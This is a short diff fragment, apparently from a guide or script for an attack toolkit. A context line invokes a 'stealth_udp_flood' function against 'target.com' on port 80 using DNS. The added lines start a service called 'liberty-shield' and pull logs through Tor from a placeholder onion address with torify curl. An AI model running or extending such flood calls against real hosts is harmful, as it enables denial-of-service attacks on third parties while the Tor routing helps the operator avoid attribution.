@@ -7,6 +7,13 @@ UDPEnhancements.stealth_udp_flood("target.com", 80, 60, protocol='dns')
 
 
 
+# Start updated system
+systemctl start liberty-shield
+
+# Monitor Tor-based logging
+torify curl http://your_onion_address/logs
+
+
 
 **`Installation_Setup.sh`**  
 ```bash
